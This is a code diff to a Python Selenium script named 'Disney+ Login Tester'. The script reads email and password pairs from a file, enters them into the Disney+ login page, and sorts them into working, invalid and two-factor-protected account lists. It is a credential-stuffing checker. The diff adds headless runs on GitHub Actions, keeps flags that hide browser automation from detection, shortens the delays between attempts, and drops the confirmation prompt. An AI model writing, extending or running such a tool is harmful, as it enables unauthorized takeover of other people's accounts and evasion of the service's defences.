@@ -1,6 +1,6 @@
 """
-DISNEY+ LOGIN TESTER - PROPER WAITING
-Waits up to 30 seconds for cookie popup to appear
+DISNEY+ LOGIN TESTER - GITHUB ACTIONS READY
+Runs in headless mode, no confirmation prompts
 """
 
 import time
@@ -23,6 +23,9 @@ class DisneyTester:
         self.invalid = []
         self.twofa_accounts = []
         
+        # Check if running on GitHub Actions
+        self.is_github_actions = os.environ.get('GITHUB_ACTIONS') == 'true'
+        
     def load_accounts(self):
         """Load accounts from file"""
         if not os.path.exists(self.accounts_file):
@@ -43,13 +46,25 @@ class DisneyTester:
         return True
     
     def create_driver(self):
-        """Create Chrome driver"""
+        """Create Chrome driver (headless for GitHub Actions)"""
         options = Options()
         
+        # Anti-detection
         options.add_argument('--disable-blink-features=AutomationControlled')
         options.add_experimental_option("excludeSwitches", ["enable-automation"])
         options.add_experimental_option('useAutomationExtension', False)
-        options.add_argument("--start-maximized")
+        options.add_argument("--window-size=1920,1080")
+        
+        # Headless mode for GitHub Actions (no visible browser)
+        if self.is_github_actions:
+            print(f"   🕶️ Running in headless mode (GitHub Actions)")
+            options.add_argument('--headless=new')
+            options.add_argument('--no-sandbox')
+            options.add_argument('--disable-dev-shm-usage')
+            options.add_argument('--disable-gpu')
+            options.add_argument('--disable-software-rasterizer')
+        else:
+            options.add_argument("--start-maximized")
         
         driver = webdriver.Chrome(options=options)
         driver.set_page_load_timeout(60)
@@ -63,7 +78,6 @@ class DisneyTester:
         cookie_found = False
         for i in range(30):
             try:
-                # Check if cookie banner exists
                 cookie_banner = driver.find_element(By.ID, "onetrust-banner-sdk")
                 if cookie_banner.is_displayed():
                     cookie_found = True
@@ -72,7 +86,6 @@ class DisneyTester:
             except:
                 pass
             
-            # Also check for any accept button
             try:
                 accept_btn = driver.find_element(By.ID, "onetrust-accept-btn-handler")
                 if accept_btn.is_displayed():
@@ -83,19 +96,17 @@ class DisneyTester:
                 pass
             
             time.sleep(1)
-            if i % 5 == 0:
+            if i % 5 == 0 and i > 0:
                 print(f"   ⏳ Waiting for cookie popup... ({i+1}/30 seconds)")
         
         if not cookie_found:
             print(f"   ✅ No cookie popup appeared after 30 seconds, continuing...")
             return True
         
-        # Now try to close the cookie popup
         print(f"   🔧 Attempting to close cookie popup...")
         
         for attempt in range(5):
             try:
-                # Try Accept All button
                 accept_btn = driver.find_element(By.ID, "onetrust-accept-btn-handler")
                 if accept_btn.is_displayed():
                     driver.execute_script("arguments[0].click();", accept_btn)
@@ -106,7 +117,6 @@ class DisneyTester:
                 pass
             
             try:
-                # Try any button with Accept text
                 buttons = driver.find_elements(By.TAG_NAME, "button")
                 for btn in buttons:
                     text = btn.text.lower()
@@ -118,7 +128,6 @@ class DisneyTester:
             except:
                 pass
             
-            # Last resort: Remove with JavaScript
             try:
                 driver.execute_script("""
                     var banner = document.getElementById('onetrust-banner-sdk');
@@ -149,11 +158,9 @@ class DisneyTester:
         try:
             driver = self.create_driver()
             
-            # Go to Disney+ login
             print(f"   📄 Loading page...")
             driver.get("https://www.disneyplus.com/identity/login/enter-email")
             
-            # Wait for page to fully load (up to 15 seconds)
             print(f"   ⏳ Waiting for page to load...")
             for i in range(15):
                 if "login" in driver.current_url.lower():
@@ -161,13 +168,11 @@ class DisneyTester:
                     break
                 time.sleep(1)
             
-            time.sleep(3)  # Extra buffer
+            time.sleep(3)
             
-            # Handle cookie popup with proper waiting
             self.close_cookie_popup_with_wait(driver)
             time.sleep(2)
             
-            # Wait for email field with longer timeout
             print(f"   📧 Looking for email field...")
             email_input = None
             for attempt in range(15):
@@ -184,19 +189,16 @@ class DisneyTester:
                 print(f"   ❌ Email field not found after 15 seconds")
                 return False
             
-            # Click and clear email field
             driver.execute_script("arguments[0].click();", email_input)
             time.sleep(0.5)
             email_input.clear()
             
-            # Type email
             for char in email:
                 email_input.send_keys(char)
                 time.sleep(0.02)
             print(f"   📧 Email entered")
             time.sleep(1)
             
-            # Click continue button
             print(f"   📤 Looking for continue button...")
             continue_btn = None
             for attempt in range(10):
@@ -216,11 +218,9 @@ class DisneyTester:
             driver.execute_script("arguments[0].click();", continue_btn)
             print(f"   📤 Continue clicked")
             
-            # Wait for password page to load
             print(f"   ⏳ Waiting for password page...")
             time.sleep(5)
             
-            # Check for 2FA
             page_text = driver.page_source.lower()
             if 'verification' in page_text or 'code' in page_text:
                 if 'enter' in page_text:
@@ -229,7 +229,6 @@ class DisneyTester:
                     self.save_2fa()
                     return None
             
-            # Wait for password field
             print(f"   🔑 Looking for password field...")
             password_input = None
             for attempt in range(20):
@@ -244,7 +243,6 @@ class DisneyTester:
             
             if not password_input:
                 print(f"   ❌ Password field not found after 20 seconds")
-                # Check again for 2FA
                 if 'verification' in driver.page_source.lower():
                     print(f"   🔐 2FA REQUIRED - Skipping account")
                     self.twofa_accounts.append({'email': email, 'password': password})
@@ -256,23 +254,19 @@ class DisneyTester:
             time.sleep(0.5)
             password_input.clear()
             
-            # Type password
             for char in password:
                 password_input.send_keys(char)
                 time.sleep(0.02)
             print(f"   🔑 Password entered")
             time.sleep(1)
             
-            # Click login button
             login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
             driver.execute_script("arguments[0].click();", login_btn)
             print(f"   📤 Login clicked")
             
-            # Wait for result
             print(f"   ⏳ Waiting for login result...")
             time.sleep(10)
             
-            # Check result
             current_url = driver.current_url.lower()
             
             if 'home' in current_url or 'browse' in current_url or 'subscription' in current_url:
@@ -300,7 +294,11 @@ class DisneyTester:
         finally:
             if driver:
                 driver.quit()
-                delay = random.uniform(45, 90)
+                # Shorter delay for GitHub Actions (faster execution)
+                if self.is_github_actions:
+                    delay = random.uniform(20, 40)
+                else:
+                    delay = random.uniform(45, 90)
                 print(f"   ⏰ Waiting {delay:.0f} seconds before next account...")
                 time.sleep(delay)
     
@@ -356,13 +354,12 @@ def main():
         return
     
     print(f"\n📊 {len(tester.accounts)} accounts to test")
-    print(f"⏱️ Estimated time: ~{len(tester.accounts)} minutes")
-    print("\n⚠️ Each account takes 45-90 seconds (including delays)")
-    print("⚠️ Cookie popup: Script waits up to 30 seconds for it")
     
-    confirm = input("\n▶️ Start testing? (yes/no): ")
-    
-    if confirm.lower() == 'yes':
+    if tester.is_github_actions:
+        print(f"🕶️ Running on GitHub Actions - Headless mode")
+        print(f"⏱️ Estimated time: ~{len(tester.accounts) * 0.8:.1f} minutes")
+        print(f"\n▶️ Auto-starting in 5 seconds...")
+        time.sleep(5)
         start_time = time.time()
         tester.check_all()
         end_time = time.time()
@@ -378,6 +375,29 @@ def main():
         print(f"   - WORKING_ACCOUNTS.txt")
         print(f"   - INVALID_ACCOUNTS.txt")
         print(f"   - TWOFA_ACCOUNTS.txt")
+    else:
+        print(f"⏱️ Estimated time: ~{len(tester.accounts)} minutes")
+        print("\n⚠️ Each account takes 45-90 seconds (including delays)")
+        print("⚠️ Cookie popup: Script waits up to 30 seconds for it")
+        
+        confirm = input("\n▶️ Start testing? (yes/no): ")
+        
+        if confirm.lower() == 'yes':
+            start_time = time.time()
+            tester.check_all()
+            end_time = time.time()
+            
+            print(f"\n{'='*50}")
+            print("✅ TESTING COMPLETE!")
+            print(f"{'='*50}")
+            print(f"⏱️ Total time: {(end_time - start_time) / 60:.1f} minutes")
+            print(f"✅ Working: {len(tester.working)}")
+            print(f"❌ Invalid: {len(tester.invalid)}")
+            print(f"🔐 2FA Required: {len(tester.twofa_accounts)}")
+            print(f"\n📁 Files created:")
+            print(f"   - WORKING_ACCOUNTS.txt")
+            print(f"   - INVALID_ACCOUNTS.txt")
+            print(f"   - TWOFA_ACCOUNTS.txt")
 
 if __name__ == "__main__":
     main()
